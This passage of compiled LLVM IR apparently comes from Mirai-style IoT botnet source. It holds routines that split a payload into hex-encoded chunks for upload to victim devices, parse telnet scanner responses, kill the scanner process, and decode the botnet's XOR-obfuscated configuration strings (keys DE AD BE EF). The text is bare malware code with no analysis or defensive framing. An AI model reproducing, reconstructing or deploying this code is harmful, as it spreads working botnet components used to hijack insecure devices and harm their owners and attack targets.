  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 3
  %23 = load i16, i16* %22, align 8
  %24 = zext i16 %23 to i32
  %25 = sdiv i32 %24, 64
  %26 = add nsw i32 %25, 1
  %27 = icmp slt i32 %20, %26
  br i1 %27, label %28, label %38

28:                                               ; preds = %19
  %29 = call noalias align 16 i8* @malloc(i64 256) #9
  %30 = load %struct.binary*, %struct.binary** %5, align 8
  %31 = load i32, i32* %3, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds %struct.binary, %struct.binary* %30, i64 %32
  %34 = getelementptr inbounds %struct.binary, %struct.binary* %33, i32 0, i32 0
  store i8* %29, i8** %34, align 8
  br label %35

35:                                               ; preds = %28
  %36 = load i32, i32* %3, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %3, align 4
  br label %19, !llvm.loop !25

38:                                               ; preds = %19
  br label %39

39:                                               ; preds = %91, %38
  store i32 0, i32* %3, align 4
  br label %40

40:                                               ; preds = %77, %39
  %41 = load i32, i32* %3, align 4
  %42 = load %struct.payload*, %struct.payload** %2, align 8
  %43 = getelementptr inbounds %struct.payload, %struct.payload* %42, i32 0, i32 3
  %44 = load i16, i16* %43, align 8
  %45 = zext i16 %44 to i32
  %46 = icmp slt i32 %41, %45
  br i1 %46, label %47, label %80

47:                                               ; preds = %40
  %48 = load i32, i32* %3, align 4
  %49 = icmp eq i32 %48, 64
  br i1 %49, label %59, label %50

50:                                               ; preds = %47
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = add nsw i32 %51, %52
  %54 = load %struct.payload*, %struct.payload** %2, align 8
  %55 = getelementptr inbounds %struct.payload, %struct.payload* %54, i32 0, i32 3
  %56 = load i16, i16* %55, align 8
  %57 = zext i16 %56 to i32
  %58 = icmp sge i32 %53, %57
  br i1 %58, label %59, label %60

59:                                               ; preds = %50, %47
  br label %80

60:                                               ; preds = %50
  %61 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 1 %61, i8 0, i64 5, i1 false)
  %62 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %63 = load %struct.payload*, %struct.payload** %2, align 8
  %64 = getelementptr inbounds %struct.payload, %struct.payload* %63, i32 0, i32 2
  %65 = load i8*, i8** %64, align 8
  %66 = load i32, i32* %4, align 4
  %67 = load i32, i32* %3, align 4
  %68 = add nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = call i32 (i8*, i8*, ...) @szprintf(i8* %62, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i64 0, i64 0), i32 %72)
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %75 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i64 0, i64 0
  %76 = call i8* @strcat(i8* %74, i8* %75) #9
  br label %77

77:                                               ; preds = %60
  %78 = load i32, i32* %3, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %3, align 4
  br label %40, !llvm.loop !26

80:                                               ; preds = %59, %40
  %81 = load i32, i32* %7, align 4
  %82 = load %struct.payload*, %struct.payload** %2, align 8
  %83 = getelementptr inbounds %struct.payload, %struct.payload* %82, i32 0, i32 3
  %84 = load i16, i16* %83, align 8
  %85 = zext i16 %84 to i32
  %86 = sdiv i32 %85, 64
  %87 = add nsw i32 %86, 1
  %88 = icmp eq i32 %81, %87
  br i1 %88, label %89, label %91

89:                                               ; preds = %80
  %90 = load %struct.binary*, %struct.binary** %5, align 8
  ret %struct.binary* %90

91:                                               ; preds = %80
  %92 = load %struct.binary*, %struct.binary** %5, align 8
  %93 = load i32, i32* %7, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.binary, %struct.binary* %92, i64 %94
  %96 = getelementptr inbounds %struct.binary, %struct.binary* %95, i32 0, i32 0
  %97 = load i8*, i8** %96, align 8
  %98 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %99 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %100 = call i32 @util_strlen(i8* %99)
  %101 = sext i32 %100 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %97, i8* align 16 %98, i64 %101, i1 false)
  %102 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %102, i8 0, i64 256, i1 false)
  %103 = load i32, i32* %7, align 4
  %104 = trunc i32 %103 to i8
  %105 = load %struct.binary*, %struct.binary** %5, align 8
  %106 = getelementptr inbounds %struct.binary, %struct.binary* %105, i32 0, i32 1
  store i8 %104, i8* %106, align 8
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %7, align 4
  %109 = load i32, i32* %3, align 4
  %110 = load i32, i32* %4, align 4
  %111 = add nsw i32 %110, %109
  store i32 %111, i32* %4, align 4
  br label %39
}

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @consume_method_resonse(%struct.scanner_connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 7
  %9 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i64 0, i64 0
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 4
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @util_memsearch(i8* %9, i32 %12, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i64 0, i64 0), i32 20)
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 -2, i32* %2, align 4
  br label %44

16:                                               ; preds = %1
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i64 0, i64 0
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 4
  %22 = load i32, i32* %21, align 8
  %23 = call i32 @util_memsearch(i8* %19, i32 %22, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i64 0, i64 0), i32 16)
  %24 = icmp ne i32 %23, -1
  br i1 %24, label %25, label %26

25:                                               ; preds = %16
  store i32 -1, i32* %2, align 4
  br label %44

26:                                               ; preds = %16
  br label %27

27:                                               ; preds = %26
  call void @table_unlock_val(i8 zeroext 12)
  %28 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %28, i8** %4, align 8
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = getelementptr inbounds [8192 x i8], [8192 x i8]* %30, i64 0, i64 0
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 4
  %34 = load i32, i32* %33, align 8
  %35 = load i8*, i8** %4, align 8
  %36 = load i32, i32* %6, align 4
  %37 = sub nsw i32 %36, 1
  %38 = call i32 @util_memsearch(i8* %31, i32 %34, i8* %35, i32 %37)
  store i32 %38, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %39 = load i32, i32* %5, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %27
  store i32 0, i32* %2, align 4
  br label %44

42:                                               ; preds = %27
  %43 = load i32, i32* %5, align 4
  store i32 %43, i32* %2, align 4
  br label %44

44:                                               ; preds = %42, %41, %25, %15
  %45 = load i32, i32* %2, align 4
  ret i32 %45
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @scanner_kill() #0 {
  %1 = load i32, i32* @scanner_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #9
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @util_strlen(i8*) #1

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #7

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

declare i32 @util_memsearch(i8*, i32, i8*, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @can_consume(%struct.scanner_connection* %0, i8* %1, i32 %2) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: nounwind
declare align 16 i8* @realloc(i8*, i64) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i8* @deobf(i8* %0, i32* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias align 16 i8* @malloc(i64 %13) #9
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  br label %20

20:                                               ; preds = %58, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %61

25:                                               ; preds = %20
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = xor i32 %31, 222
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %29, align 1
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 173
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 190
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 239
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  br label %58

58:                                               ; preds = %25
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %20, !llvm.loop !27

61:                                               ; preds = %20
  %62 = load i8*, i8** %6, align 8
  ret i8* %62
}

declare void @util_memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { argmemonly nofree nounwind willreturn writeonly }
attributes #3 = { nofree nosync nounwind willreturn }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { argmemonly nofree nounwind willreturn }
attributes #8 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { nounwind }
attributes #10 = { noreturn nounwind }
attributes #11 = { nounwind readnone willreturn }
attributes #12 = { nounwind readonly willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
